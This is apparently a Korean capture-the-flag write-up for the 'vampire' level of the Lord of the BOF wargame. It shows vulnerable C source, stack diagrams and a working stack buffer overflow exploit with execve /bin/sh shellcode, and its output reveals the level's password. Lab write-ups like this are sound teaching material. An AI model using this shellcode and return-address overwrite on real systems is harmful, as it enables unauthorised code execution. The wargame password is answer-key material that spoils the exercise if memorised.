============================================================================================================
[redhat-lob] (9) vampire
============================================================================================================


.. graphviz::

    digraph foo {
        a -> b -> c -> d;

        a [shape=box, label="dummy * 44 + (argv[1] address+4*i) + dummy * 100000 + shellcode"];
        b [shape=box, color=lightblue, label="strcpy"];
        c [shape=box, label="Buffer Overflow"];
        d [shape=box, label="shellcode address"];
    }


|

Source Code
============================================================================================================


.. code-block:: c

    #include <stdio.h>
    #include <stdlib.h>

    main(int argc, char *argv[])
    {
        char buffer[40];

        if(argc < 2){
            printf("argv error\n");
            exit(0);
        }

        if(argv[1][47] != '\xbf')
        {
            printf("stack is still your friend.\n");
            exit(0);
        }

        // here is changed!
        if(argv[1][46] == '\xff')
        {
            printf("but it's not forever\n");
            exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
        printf("%p\n", buffer);
    }


|

Vulnerabliity Vector
============================================================================================================

main 함수의 ret를 덮어씌워 오버플로우를 발생시킨다.

.. code-block:: console

    ==============================
    LOW     
    ------------------------------
    local variables of main
    saved registers of main
    return address of main <<- overflow
    argc
    argv
    envp
    stack from startup code
    argc
    argv pointers
    NULL that ends argv[]
    environment pointers
    NULL that ends envp[]
    ELF Auxiliary Table
    argv strings
    environment strings
    program name
    NULL
    ------------------------------
    HIGH (0xC0000000)    
    ==============================

|

Buffer Overflow
============================================================================================================

Overflow condition 

- argv[1] value의 47번째 문자가 "\\xbf"이어야 함
- argv[1] value의 46번째 문자가 "\\xff"가 아니어야 함

.. code-block:: console

    ※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행
    $ bash2
    $ ./vampire2 `python -c 'print "a"*47'`

    stack is still your friend.

    $ ./vampire2 `python -c 'print "a"*47+"\xbf"'`

    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒
    Segmentation fault



|

exploit
============================================================================================================

argv[1]의 주소값 변경
------------------------------------------------------------------------------------------------------------

argv[1]의 주소가 "\\xbf\\xff"로 시작하기 때문에 argv[1]에 nop를 100000만큼 삽입하여 주소값을 "\\xbf\\xfe"로 시작하도록 한다.

.. code-block:: console

    $ ./vampire2 `python -c 'print "a"*47+"\xbf"+"\x90"*100000'`
    buffer : 0xbffe7460
    argv[1]: 0xbffe74d8

    Segmentation fault

|

argv[1] pointers 쉘코드 실행
------------------------------------------------------------------------------------------------------------

.. code-block:: console

    ==============================
    LOW     
    ------------------------------
    local variables of main
    saved registers of main
    return address of main <<- overflow
    argc
    argv
    envp
    stack from startup code
    argc
    argv pointers ->> shellcode
    NULL that ends argv[]
    environment pointers
    NULL that ends envp[]
    ELF Auxiliary Table
    argv strings
    environment strings
    program name
    NULL
    ------------------------------
    HIGH (0xC0000000)    
    ==============================

|


오버플로우시 RET를 shellcode를 삽입한 주소로 덮어씌워 해당 쉘코드가 실행되도록 한다. buffer의 최초 주소값을 확인하여 4바이트씩 증가하면서 주소를 변경하면서 공격을 진행하면 성공시킬 수 있다.

.. code-block:: console

    $ ./vampire `python -c 'print "\x90"*44 + "\xd8\x74\xfe\xbf" + "\x90"*100000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`

    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
                                           ̀▒▒▒▒

    bash$ whoami
    vampire
    bash$ my-pass
    euid = 509
    music world


